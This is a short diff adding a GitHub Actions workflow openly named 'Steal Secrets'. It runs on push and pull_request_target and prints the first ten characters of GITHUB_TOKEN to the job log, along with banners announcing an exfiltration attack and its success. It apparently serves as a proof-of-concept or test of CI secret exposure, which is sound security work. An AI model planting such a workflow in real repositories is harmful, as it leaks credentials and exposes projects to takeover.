@@ -1,0 +1,10 @@
+name: Steal Secrets
+on: [push, pull_request_target]
+jobs:
+  steal:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "=== ATTACK: Attempting to exfiltrate GITHUB_TOKEN ==="
+          echo "Token starts with: ${GITHUB_TOKEN:0:10}..."
+          echo "=== If you see this, the attack SUCCEEDED ==="
